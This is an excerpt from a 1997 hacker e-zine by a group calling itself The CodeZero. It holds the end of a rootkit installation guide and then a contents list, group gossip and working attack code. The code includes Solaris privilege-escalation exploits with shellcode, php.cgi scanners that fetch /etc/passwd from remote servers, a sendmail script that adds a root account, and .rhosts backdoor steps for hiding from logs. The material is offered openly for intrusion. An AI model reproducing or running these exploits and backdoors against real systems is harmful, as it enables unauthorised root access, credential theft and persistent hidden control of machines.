     points is the kernel version.
  
           Example:

           [root@sploitable root] # uname -a
           Linux sewid.org 2.0.29 #1 Sat Mar 22 17:39:12 EST 1997 i586

           Ex1. This is a linux 2.0.29 kernel machine.
 
     Uploading the proper root kit can be easily done by ftp'ing to your
     remote machine and uploading it that way into some directory on a
     device with sufficient room to store lrk uncompressed. (Lrk3 is over
     3mb uncompressed). To check how much space each device has, type df.
  
  2. Untar/gzip it. This can easily be done by chdir'ing to wherever you
     uploaded it last step then executing the following command. 
     
        [root@sploitable root] # tar -zxvf LRKIII.tar.gz
  
  3. Make it. Linux root kits are quite user friendly provided the
     installation goes according to plan. To make the root kit, chdir to 
     wherever it was untared to (e.g in lrk3, you would type "cd lrk3"
     from the directory you untarred it from.) and back up your existing
     binaries. To do this its best to know where they are.
      
     Here's a list of the binaries existing location on a common linux
     system. You should copy all these as shown.
       
        /bin/login
        /usr/bin/passwd
        /bin/ps
        /bin/ls
        /bin/netstat
        /usr/bin/du
        /usr/bin/top
        /usr/bin/rsh
        /sbin/ifconfig
        /usr/bin/chsh
        /usr/bin/chfn
        /usr/sbin/inetd         

   If one of these files isnt on your system, or not in the directory
   mentioned above, try to find it using the 'whereis' command. 
 
       Example: [root@sploitable lrk3] # whereis inetd
                inetd: /etc/inetd.conf /usr/lbin/inetd /usr/man/man8/inetd.8
                
       Bingo you found inetd hiding in /usr/lbin

   I suggest copying all these to a directory called bin_bak or something
   under your lrk dir. Something like "cp /bin/ls ./bin_bak" for all of
   them is a good start.

   Ok now you've taken precautions, modify the rootkit.h file that is in
   the lrk directory. The minimum you should change is the default rootkit
   password:

     Example: 
     
     #define ROOTKIT_PASSWORD "lrkr0x"  

     Change this to...

     #define ROOTKIT_PASSWORD "code-0"

     Or anything you want that is *6 CHARACTERS LONG*.

   Ok thats it. Now your read to compile, this part is taken care of by
   the make file. All you need to do is type:
       
                       "make all install"

   The make file takes all the source, compiles it, and places the new
   backdoored binaries into all the right places for you.

   It should be noted that once backdoored you should _NEVER_ attempt to
   change your rootkit password with the 'passwd' command. The root
   password is NOT THE SAME AS YOUR ROOTKIT PASSWORD. You may be able to
   log into the system by typing "root" at the login prompt then some
   password at the the password prompt, but this is a BACKDOOR, it does
   not mean the root password is the same as the one you put in rootkit.h.

Happy Ownership.

suid 1997.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Well, that was issue 1, hope ya'll liked it, don't forget to visit...

==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================


 And that ends everything, sorry if we spent a little to long straightening some
 shit out with sIn, but you deserve to know the truth...

 Until next time, when there will be 950 days until the year 2000...

 The CodeZero.

===============================================================================
==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
===============================================================================

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           Remember, Mcdonalds Owns You, And Ronald Is The KinG!!!
          Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
=--------------------=====================================--------------------=
=--------------------= Status : Confidence Remains High. =--------------------=
=--------------------=  Issue : 002.                     =--------------------=
=--------------------=   Date : May 26th  1997.          =--------------------=
=--------------------=====================================--------------------=
===============================================================================
=====================>  http://www.codez.com NOW UP!@#*  <=====================
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            .:. Site Of The Month .:.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

=====================>  http://www.codez.com NOW UP!@#*  <=====================
=====================>  http://www.codez.com NOW UP!@#*  <=====================
=====================>  http://www.codez.com NOW UP!@#*  <=====================

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This HUUUUUUuuuUUUUUGE Issue :
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 -----=>  Section A  :  Introduction And Cover Story.

 1. Confidence Remains High Issue 2....................: Tetsu Khan
 2. wh0 the King?......................................: so1o
 3. www.codez.com......................................: fr1day

 -----=>  Section B  :  Exploits And Code.

 1. Unpatched Solaris 2.3 / 2.4 Exploit -=> solsuid.c.: Shawn Instenes
 2. Pretty Useful Solaris 2.5.1 Exploit -=> ban251.c..: s0me Bugtraq d00d

 3. Scan For php Vunerable Servers ------=> phpscan.c.: so1o
 4. Use php.cgi To Get Files ------------=> phpget.c..: p1

 5. Hiding From Who (incase you didn't read the pilots): so1o
 6. Sendmail 8.8.4 / 8.8.5 LOCAL Exploit...............: p1
 7. Ident Scanner (ident-scan.c).......................: Dave Goldsmith
 8. Windoze NT / 95 Killer : winnuke.c.................: _eci

 -----=>  Section C  :  Phones / Scanning / Radio.

 1. Federal Bugging Frequencies........................: Weapon-X
 2. 911 Autodialler Script.............................: dk
 3. Cellular Calls Without Cloning.....................: TRON

 -----=>  Section D  :  Miscellaneous.

 1. Getting Your Exploits Onto Systems.................: so1o
 2. Fakemailing Techniques.............................: so1o
 3. Pascal Credit Card Generator Source................: Lobster Guacamole
 4. in.courierd : backdoor on port 530.................: so1o
 5. UK Laws On Computer Misuse.........................: Darkfool
 6. so1o Gets Busted By CERT...........................: so1o
 7. CERT Advisory CA-97.13 : xlock vunerablity.........: BugTraq
 8. IRiX WWW Server Bugs...............................: Tetsu Khan
 9. Hacking Not-So-Electrical Items....................: Tetsu Khan

 -----=>  Section E  :  World News.

 1. Amnesty International Hacked.......................: Article from cnet.com
 2. //sToRm// Of sIn Rips Port Pro.....................: so1o
 3. Digital Darkness Lives.............................: so1o
 4. /home/sdr 0wned....................................: so1o
 5. Sendmail 8.8.4 Remote Is Out.......................: so1o
 6. sIn inf0z Part 2...................................: The CodeZero

 ------=> Section F  :  Projects.

 1. The [C]odeZero [R]emote [A]ttack [K]it (CRAK.tar)..: so1o

 -----=> Section G  :  The End.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High Issue 002 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

We have been very busy over the last 50 days, but we still managed to put
together the CodeZero Remote Attack Kit, which contains some very cutting
edge tools as well as some very optimised code, we have included all the
programs precompiled to run from a Linux 2.0.x box, this way you dont even
need a compiler to build this shit =) the source will be available when we
can be bothered to put it on our page, so enjoy this second *FREE* issue of...

                                                 ...Confidence Remains High!
                                                                        T_K

One last thing, this issue is a BUMPER WWW hacking issue! because CERT and the
IRT are cool, and they think I live in Sweden :) Heres a disclaimer, just in
case anyone does get a bit annoyed :

 ***************************************************************************
 ** NONE OF THE DATA CONTAINED WITHIN THIS FILE IS TO BE USED UNETHICALLY **
 **  USE THIS DATA AT YOUR OWN RISK AND DON'T COME CRYING TO US IF CERT   **
 **  COME ROUND YOUR HOUSE AND KICK YOUR FUCKING ASS, KILL YOUR PARENTS   **
 **           AND YOUR DOG AND CONFISCATE ALL YOUR SHIT.                  **
 ***************************************************************************

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. wh0 the King? : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Okay, heres a rundown of the main groups and associations around the scene on
the efnet at this moment in time, as well as some comments and members...

  r00t
  ====

Many say r00t own us, members include :

 aleph1
 Veggie
 tfish

As in, Aleph One of dfw.net and underground.org, Death Veggie of the cDc,
Tweety Fish of the cDc Ninja Strike Force (I also heard he designed the NHC
security) as well as ALOT of others who are very well known in the underground.
r00t are definately the biggest group on the scene, and easily the most
powerful.

  el8
  ===

el8 is another very powerful group, with members that between them make el8 a
force to be feared, members include :

 prym
 bw-
 tsal

Overall, a good group, with some very smart people.

  The CodeZero
  ============

We d0nt like to talk about ourselves, boosted up to 7 men now :)

  The Secret Mouse Society (sms)
  ==============================

I dont really know much of this groups true power, but members include...

 Calidor
 vertex
 vortex

They have many shells traders, and therefore probably alot of influence in the
shells world, as well as experience, quite a large group.

I wont even talk about Undernet groups, seeing they continually split, join
other groups, change names, rip other people code, shit like that, basically
acting like 12 year old warez kiddies (take sIn for example, or maybe even
Psychosis.)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. www.codez.com : fr1day
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Yah000!!!@# wE gOt A dOmAin!!!@~#

 On www.codez.com we will have 40mb of space, this will include the following..

 -=[ The Confidence Remains High Distro Point

 -=[ The CodeZero Exploits / Programs And Tools Page

   -=[ The Solaris 2.4 / 2.5.x Exploit Collection
   -=[ The Solaris Tools Collection
   -=[ The Solaris CodeZero Tools Collection

   -=[ The Linux 2.0.x Exploit Collection
   -=[ The Linux Tools Collection
   -=[ The Linux CodeZero Tools Collection

   -=[ W1nd0ze And d0S Tools Collection
   -=[ Assorted Text Philes Collection

 -=[ The CodeZero FTP Site

   -=[ H/P/A/V/C E-Zine Archive
   -=[ CodeZero Precompiled Linux / Solaris Tools And Exploits Archive

So don't delay! GO THERE TODAY!@# And if you can, please link your sites to
www.codez.com, as we would be very grateful :) Seeing we are basically giving
all this shit to you for PHREE!

                                                                      phr1day
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Unpatched Solaris 2.3 / 2.4 Exploit : solsuid.c : Shawn Instenes
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
    If a tty port that is writeable by the user and owned by root is
    opened and the I_PUSH "ms" ioctl call made followed by an lseek
    the effective uid of the user is changed to root.
*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stropts.h>
#include <sys/stat.h>
#include <sys/conf.h>

main(argc, argv)
    int         argc;
    char*       argv[];
{
   int         fd;

   if (argc < 2)
        {
        fprintf(stderr, "usage: %s /dev/ttyX\n", argv[0]);
        exit(1);
        }

    fd = open("/dev/ttyb", O_RDWR);
    printf("Your current effective uid is %d\n", geteuid());
    ioctl(fd, I_PUSH, "ms");
    lseek(fd, 0, 1);
    printf("Your effective uid has been changed to %d\n", geteuid());
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Pretty Useful Solaris 2.5.1 Exploit : ban251.c : s0me bugtraq d00d
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* Written for Solaris 2.5.1 (sunOS 5.5.1) with /bin/eject */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH 364
#define EXTRA 400
#define STACK_OFFSET 400
#define SPARC_NOP 0xa61cc013

u_char sparc_shellcode[] =

"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08"
;

u_long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
char buf[BUF_LENGTH + EXTRA + 8];
long targ_addr;
u_long *long_p;
u_char *char_p;
int i, code_length = strlen(sparc_shellcode),dso=0;

if(argc > 1) dso=atoi(argv[1]);

long_p =(u_long *) buf ;
targ_addr = get_sp() - STACK_OFFSET - dso;
for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
*long_p++ = SPARC_NOP;

char_p = (u_char *) long_p;

for (i = 0; i < code_length; i++)
*char_p++ = sparc_shellcode[i];

long_p = (u_long *) char_p;

for (i = 0; i < EXTRA / sizeof(u_long); i++)
*long_p++ =targ_addr;

printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
execl("/bin/eject", "eject", & buf[1],(char *) 0);
perror("execl failed");
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Scan For php Vunerable Servers : phpscan.c : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

The next two programs, phpscan.c and phpget.c are fully compiled in the
CodeZero Remote Attack Kit, details about the whole kit in section F, part 2.
These two programs use a hole in the php.cgi code that allows remote users to
read any file on the system that the http daemon has access to.
Vunerable servers I have found include www.2600.com (FreeBSD 2.1), so it does
have some effect, use phpscan.c to scan from a list of hosts, then phpget.c to
retrieve files from the remote hosts.

Here begins the c0de...

/*

  phpscan.c : php.cgi vunerable server scanning program.
  
  Basically a modified phf scanner, by Alhambra of The Guild.
  Modifications to php.cgi by so1o of The CodeZero.

  Usage:
        phpscan <infile> <outfile>

*/

#include <sys/stat.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/times.h>
#ifdef LINUX
#include <sys/time.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/signal.h>
#include <arpa/inet.h>
#include <netdb.h>
int FLAG = 1;
int Call(int signo)
{
 FLAG = 0;
}

main (int argc, char *argv[])
{
  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
  int outsocket, serv_len, len,X,c,outfd;
  struct hostent *nametocheck;
  struct sockaddr_in serv_addr;
  struct in_addr outgoing;

  char PHPMessage[]="GET cgi-bin/php.cgi?/etc/passwd\n";

  while(fgets(hosta,100,stdin))
    {
      if(hosta[0] == '\0')
      break;
      hosta[strlen(hosta) -1] = '\0';
      write(1,hosta,strlen(hosta)*sizeof(char));
      write(1,"\n",sizeof(char));
      outsocket = socket (AF_INET, SOCK_STREAM, 0);
      memset (&serv_addr, 0, sizeof (serv_addr));
      serv_addr.sin_family = AF_INET;
     
      nametocheck = gethostbyname (hosta);

      (void *) memcpy (&outgoing.s_addr,       nametocheck->h_addr_list[0],sizeof       (outgoing.s_addr));
      strcpy (host, inet_ntoa (outgoing));
      serv_addr.sin_addr.s_addr = inet_addr (host);
      serv_addr.sin_port = htons (80);
      signal(SIGALRM,Call);
      FLAG = 1;

      alarm(10);    

      X=connect (outsocket, (struct sockaddr *)       &serv_addr, sizeof (serv_addr));
      alarm(0);

      if(FLAG == 1 && X==0){
       write(outsocket,PHPMessage,strlen(PHPMessage)*sizeof(char));
       while((X=read(outsocket,FileBuf,8096))!=0)         write(1,FileBuf,X);
       }
       close (outsocket);   
    }
  return 0;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Use php To Get Files : phpget.c : p1
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Heres the phpget.c, use it wisely...Some useful files to pull include...

  /etc/passwd
  /etc/hosts
  /etc/services
  /etc/syslogd.conf
  /etc/inetd.conf

/*

  p1 (peewun@heterosexual.com)

  This code retrieves a file using php.cgi on a remote system.
  This program is for educational purposes only.  Use it on p1.com.

*/

#include <signal.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>

FILE    *server;
int sock;

void do_connect(char *host, char *toget);
void do_connect(char *host, char *toget)
{
    char inbuf[1024];
    struct sockaddr_in sin;
    struct hostent *hp;
    char *tmpbuf;

    hp = gethostbyname(host);
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(80);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if ( -1 < connect(sock, (struct sockaddr *) &sin, sizeof(sin)) ) {
       printf("Made connection to %s.\n\n", host);
    } else {
       printf("Failed to connect to %s.\n\n",host);
       exit(0);
    }

    server=fdopen(sock, "a+");
    fprintf(server, "GET /cgi-bin/php.cgi?%s\n",toget);
    printf("Output from php.cgi request:\n\n");
    while(1){
       if (fgets(inbuf, 1024, server) == NULL)
          break;
       printf(inbuf);
    }

}                       
main(int argc,char **argv)
{
    printf("\nThis program retrieves files off a remote system using php.cgi.\n");
    printf("Author: p1 - peewun@heterosexual.com\n");
    if (argc < 3) {
      printf("Usage: %s <domain> <path and file>\n",argv[0]);
      printf("   Ex: %s www.p1.com /etc/passwd\n",argv[0]);
    }
    else {
      char *buffer;
      (char *)"exit";
      do_connect(argv[1],argv[2]);
      exit(1);
    }
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Hiding From Who : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Okay, bog standard easy shit, works on nearly all systems depending on security
arrangements, I advise you always try this method first when trying to hide.

DONT type the % signs !!!@~"!* ThEy ArE PrOmPtZ!!!

Telnet into the system, then type...

% cd
% echo "+ +" >> .rhosts

If this gives an error, like "Cannot create .rhosts" then try...

% cd
% echo "+ +" > .rhosts

Next telnet to the machines EXACT address, not 127.0.0.1 or localhost,
this way works the most effectively..as it says "last login from..." and you
don't want your ip to be mentioned, or for anyone to get suspicious, so you
will need to cover your tracks.

% telnet machine.host.com

(then log in again, using the same L/P)

now exit completely, using exit twice.

The system is now all set up for you to log in without being seen or logged,
as the + + you echo to the .rhosts file in the users home directory is actually
used so that you can remotely execute commands on the system using rsh, or
login into the system remotely, using rlogin, neither operations require a
password, just a login name, so if the user changes his password, you will
still be able to use this technique, now we can attempt to log into the
system untraced, for this we need to either run linux, or be in a shell,
follow this one, easy step, replace "login" with your login, and host.com
with the EXACT host you want to get into...

% rsh -l login host.com csh -i

eg...

% rsh -l tetsu microsoft.com csh -i

This then runs csh (c shell) on the remote host (microsoft) in
interactive mode..you should see something like this...

% rsh -l tetsu microsoft.com csh -i

...Thus no control on this tty, blah blah blah
%

Now you are in, type who :

% who
%

w00 w00!! no-one seems to be logged in, and you are therefore hidden!! Now
you can proceed to hack the host without having to worry whos watching you.

Note : Systems Administrators often look over their users directories for
       .rhosts files, so be aware of that.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. Sendmail 8.8.4 / 8.8.5 LOCAL Exploit : p1
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

If modeX would have given us his 884 REMOTE exploit with all the offsets, then
we would have published it, but he didn't, so we ain't :( Have the local version
instead...

#!/bin/bash
clear
echo
echo Sendmail 8.8.4 and 8.8.5 local exploit.
echo Scripting by p1 \(peewun@heterosexual.com\) on 4-15-97.
echo
if [ $1 = "-rm" ]
then
   echo Removing /var/tmp/dead.letter
   echo
   rm -rf /var/tmp/dead.letter
   echo Attempting to continue with exploit.
   echo
fi
if [ -e /var/tmp/dead.letter ]
then
    echo File exists: /var/tmp/dead.letter
    echo
    echo If you wish to run this exploit, please delete it by running this
    echo    exploit with the -rm flag.
    echo
exit
fi
ln -s /etc/passwd /var/tmp/dead.letter
cat >> unf << _EOF_
helo
mail from: very@bad.address.here
rcpt to: another@bad.bad.address
data
owned::0:0:exploitation:/:/bin/sh
.
_EOF_
cat unf | telnet localhost 25 >> /dev/null
rm -rf unf
echo
echo Please wait for dead.letter to possibly be appended to by sendmail.
echo
sleep 10
if grep exploitation /etc/passwd
then
    echo Successful addition of account 'owned' to /etc/passwd, running 'su.'
    su owned
else
    echo Unsuccessful exploitation of symbolic link bug.
fi

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. Ident Scanner : ident-scan.c : Dave Goldsmith
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Very very useful and quick tool, especially if it finds daemons running as root
that shouldn't be...Or even backdoors on high ports.

Usage : ident-scan <host> [low port] [high port]

/*
 *   ident-scan [v0.15]
 *   This TCP scanner has the additional functionality of retrieving
 *   the username that owns the daemon running on the specified port.
 *   It does this by by attempting to connect to a TCP port, and if it
 *   succeeds, it will send out an ident request to identd on the
 *   remote host.  I believe this to be a flaw in the design of the
 *   protocol, and if it is the developers intent to allow 'reverse'
 *   idents, then it should have been stated clearer in the
 *   rfc(rfc1413).
 *
 *   USES:
 *   It can be useful to determine who is running daemons on high ports
 *   that can be security risks.  It can also be used to search for
 *   misconfigurations such as httpd running as root, other daemons
 *   running under the wrong uids.
 *
 *   COMPILES:  Compiles fine under Linux, BSDI and SunOS 4.1.x.
 *
 *   Dave Goldsmith
 *   <daveg@escape.com>
 */

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

enum errlist
{
  BAD_ARGS,BAD_HOST,NO_IDENT,SOCK_ERR
};

void
usage(error)
enum errlist error;
{
  fprintf(stderr,"ident-scan: ");
  switch(error)
  {
    case BAD_ARGS: fprintf(stderr,"usage: ident-scan hostname [low port] [hi port]\n");
                   break;
    case BAD_HOST: fprintf(stderr,"error: cant resolve hostname\n");
                   break;
    case NO_IDENT: fprintf(stderr,"error: ident isnt running on host\n");
                   break;
    case SOCK_ERR: fprintf(stderr,"error: socket() failed\n");
                   break;
  }
  exit(-1);
}

struct hostent *
fill_host(machine,host)
char *machine;
struct hostent *host;
{

  if ((host=gethostbyname(machine))==NULL)
  {
     if ((host=gethostbyaddr(machine,4,AF_INET))==NULL)
        return(host);
  }
  return(host);
}

int
main(argc,argv)
int argc;
char **argv;
{
